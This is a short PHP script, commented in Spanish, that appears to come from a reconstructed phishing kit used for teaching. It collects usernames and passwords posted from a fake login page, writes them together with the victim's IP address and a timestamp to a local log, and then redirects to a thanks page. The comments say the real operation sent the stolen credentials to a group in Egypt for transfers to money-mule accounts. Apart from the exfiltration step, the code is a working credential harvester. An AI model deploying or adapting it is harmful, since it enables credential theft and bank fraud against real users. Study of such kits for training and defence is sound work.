<?php
/*
 * harvest.php — FUNCIONAL, con la exfiltración sustituida por un log
 * LOCAL. Ver annotations.md, secciones 1 y 5, y HOW_TO_RUN_LOCALLY.md.
 * Nunca hace ninguna petición de red saliente.
 */

$user = $_POST['username'] ?? null;
$pass = $_POST['password'] ?? null;

if (!$user || !$pass) {
    header('Location: index.html?error=1');
    exit;
}

// EN LA OPERACIÓN REAL: estas credenciales viajaban al grupo en Egipto,
// que las usaba para iniciar transferencias hacia cuentas de "mulas" en
// EE.UU. (ver mule_recruitment_flyer.txt). AQUÍ: solo un log local.
$log_line = "Usuario: $user\nClave: $pass\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? '?') . "\nFecha: " . date('c') . "\n";
file_put_contents(__DIR__ . '/__DEMO_LOG__.txt', "=== credencial capturada (demo) ===\n$log_line\n", FILE_APPEND);

header('Location: thanks.html');
exit;
